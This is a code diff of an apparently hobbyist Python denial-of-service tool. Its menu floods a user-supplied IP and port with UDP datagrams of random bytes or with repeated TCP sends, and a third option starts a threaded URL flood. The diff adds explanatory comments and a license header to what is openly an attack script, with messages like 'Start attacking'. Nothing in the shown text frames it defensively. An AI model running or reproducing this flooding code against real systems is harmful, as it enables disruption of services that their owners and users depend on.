@@ -1,3 +1,7 @@
+# By transcrime
+# GPL-3.0 license
+
+
 import socket
 import random
 import sys
@@ -14,13 +18,13 @@ print("4.Exit")
 
 choice = input("-->")
 
-if choice == "1":
+if choice == "1": # UDP is working
  #def udp_flood(target_ip, ipport):
   target_ip = input("put in ip --> ")
   ipport = int(input("now put in ip port --> "))
-  client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-  packet = os.urandom(5024)
+  client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #  Socket.AF_INET IS FOR IPv4, Socket.SOCK_DGRAM IS FOR UDP DATAGRAM BASED, CONNECTIONLESS  
+  client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # ALLOWS THE SOCKET TO REUSE A LOCAL ADDRESS (IP AND PORT)
+  packet = os.urandom(5024) # THIS GENERATES 5024 REANDOM BYTES
   client.sendto(packet, (target_ip, ipport))
   print("Targeting {target_ip}:{ipport} with UDP packet")
   try:
@@ -33,7 +37,7 @@ if choice == "1":
 elif choice == "2":
  target_ip = input("IP --> ")
  ipport = int(input("IP PORT --> "))
- client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket.SOCK_STREAM SPECIFICALLY THIS SOCKET WILL USE TCP 
  print(f"Start attacking on {target_ip}:{ipport}")
  client.connect((target_ip,ipport))
  client.send(b"\x10" * 5024)
@@ -49,18 +53,8 @@ elif choice == "2":
    sys.exit()
  except ConnectionResetError:
    print("An existing connection was forcibly closed by the remote host - Most likely done by a firewall or something else")
-#try:
-   #while True:
- #for _ in range(5):
-        #lient.connect((target_ip,ipport))
-       #client.send(b"\x10" * 1024)
-        #rint(f"sending attack {target_ip}:{ipport}")
- #except KeyboardInterrupt:
-      #client.close()
-      #sys.exit()
- #except socket.error:
-       #print("ERROR")
-elif choice == "3":
+
+elif choice == "3": # Working progress
  
  target_url = input("URL -->")
  num_threads = int(input("Threads -->"))
@@ -108,3 +102,5 @@ elif choice == "4":
 #except KeyboardInterrupt:
  #client.close()
  #sys.exit()
+
+
